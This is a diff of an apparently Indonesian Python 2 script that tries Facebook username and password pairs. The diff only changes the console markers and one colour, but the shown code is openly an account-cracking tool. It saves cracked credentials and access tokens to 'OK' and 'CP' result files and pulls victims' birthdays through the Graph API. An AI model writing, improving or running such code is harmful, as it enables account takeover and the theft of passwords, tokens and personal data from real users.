@@ -337,7 +337,7 @@ class ngentod:
                 sys.stdout.flush()
                 b_api(self, user, zona)
             if 'session_key' in response.text and 'EAAA' in response.text:
-                print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
+                print '\r %sX==> %s ◊ %s ◊ %s ' % (O,user,pw,response.json()['access_token'])
                 ok.append('%s ◊ %s ◊ %s' % (user,pw,response.json()['access_token']))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                 break
@@ -348,7 +348,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r %s*--> %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
+                    print '\r %sX==> %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
                     cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -357,14 +357,14 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
+                print '\r %sX==> %s ◊ %s           ' % (K,user,pw)
                 cp.append('%s ◊ %s' % (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                 break
                 continue
         loop += 1
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
-        print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
+        print('\r %sX==> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
     def basic(self, user, zona):
         try:
